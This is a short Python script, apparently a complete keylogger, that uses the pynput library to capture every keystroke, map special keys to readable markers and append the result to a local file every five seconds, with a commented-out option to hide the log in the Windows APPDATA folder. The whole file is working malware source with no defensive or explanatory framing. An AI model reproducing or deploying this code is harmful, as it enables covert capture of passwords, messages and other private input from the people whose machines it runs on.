import pynput.keyboard
import threading
import os

keys =""
#path = os.environ["appdata"] + "\\keylogger.txt"
path = "keylogger.txt"
def process_keys(key):
	global keys
	try:
		#keys = keys +key.char.encode("utf-8")
		keys = keys + str(key.char)
	except AttributeError:
		if key == key.space:
			keys = keys + " "
		elif key == key.enter:
			keys = keys + "[Enter]\n"
		elif key == key.right:
			keys = keys + ""
		elif key == key.left:
                        keys = keys + ""
		elif key == key.down:
                        keys = keys + ""
		elif key == key.up:
                        keys = keys + ""
		else:
			keys = keys + " " + str(key) + " "

def report():
	global keys
	global path
	fil= open(path,'a')
	fil.write(keys)
	keys=""	
	fil.close()
	timer=threading.Timer(5,report)
	timer.start()

def start():
	keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
	with keyboard_listener:
		report()
		keyboard_listener.join()

